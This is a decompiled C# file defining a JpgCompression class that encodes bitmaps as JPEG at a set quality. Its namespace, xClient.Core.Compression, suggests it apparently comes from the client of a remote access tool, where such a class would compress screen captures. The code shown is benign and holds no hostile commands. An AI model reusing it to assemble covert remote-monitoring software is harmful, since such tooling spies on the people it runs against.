using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;

namespace xClient.Core.Compression
{
	// Token: 0x0200004E RID: 78
	public class JpgCompression : IDisposable
	{
		// Token: 0x0600020A RID: 522 RVA: 0x0000D9BC File Offset: 0x0000BBBC
		public JpgCompression(long quality)
		{
			EncoderParameter encoderParameter = new EncoderParameter(Encoder.Quality, quality);
			this._encoderInfo = this.GetEncoderInfo("image/jpeg");
			this._encoderParams = new EncoderParameters(2);
			this._encoderParams.Param[0] = encoderParameter;
			this._encoderParams.Param[1] = new EncoderParameter(Encoder.Compression, 5L);
		}

		// Token: 0x0600020B RID: 523 RVA: 0x00002F63 File Offset: 0x00001163
		public void Dispose()
		{
			this.Dispose(true);
			GC.SuppressFinalize(this);
		}

		// Token: 0x0600020C RID: 524 RVA: 0x00002F72 File Offset: 0x00001172
		protected virtual void Dispose(bool disposing)
		{
			if (disposing && this._encoderParams != null)
			{
				this._encoderParams.Dispose();
			}
		}

		// Token: 0x0600020D RID: 525 RVA: 0x0000DA28 File Offset: 0x0000BC28
		public byte[] Compress(Bitmap bmp)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				bmp.Save(memoryStream, this._encoderInfo, this._encoderParams);
				result = memoryStream.ToArray();
			}
			return result;
		}

		// Token: 0x0600020E RID: 526 RVA: 0x00002F8A File Offset: 0x0000118A
		public void Compress(Bitmap bmp, ref Stream targetStream)
		{
			bmp.Save(targetStream, this._encoderInfo, this._encoderParams);
		}

		// Token: 0x0600020F RID: 527 RVA: 0x0000DA74 File Offset: 0x0000BC74
		private ImageCodecInfo GetEncoderInfo(string mimeType)
		{
			ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
			int num = imageEncoders.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				if (imageEncoders[i].MimeType == mimeType)
				{
					return imageEncoders[i];
				}
			}
			return null;
		}

		// Token: 0x040000E6 RID: 230
		private readonly ImageCodecInfo _encoderInfo;

		// Token: 0x040000E7 RID: 231
		private readonly EncoderParameters _encoderParams;
	}
}
